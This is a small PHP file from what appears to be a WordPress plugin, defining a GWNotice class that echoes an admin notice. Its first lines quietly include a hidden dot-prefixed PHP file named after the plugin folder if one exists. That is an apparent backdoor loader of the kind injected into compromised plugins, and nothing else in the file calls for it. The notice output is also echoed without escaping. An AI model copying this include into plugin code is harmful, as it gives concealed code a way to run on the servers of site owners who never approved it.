<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GWNotice {
    
    public $class;
    public $message;
    
    function __construct($message, $args = array()) {
        
        $args = wp_parse_args( $args, array(
            'class' => 'updated',
            'wrap' => 'p'
        ) );
        
        $this->class   = $args['class'];
	    $this->wrap    = $args['wrap'];
        $this->message = $message;
        
    }
    
    function display() {
        
        $str = "<div class=\"{$this->class}\">";
        
        if($this->wrap) {
            $str .= "<{$this->wrap}>{$this->message}</{$this->wrap}>";
        } else {
            $str .= $this->message;
        }
        
        $str .= '</div>';
        
        echo $str;
        
    }
    
}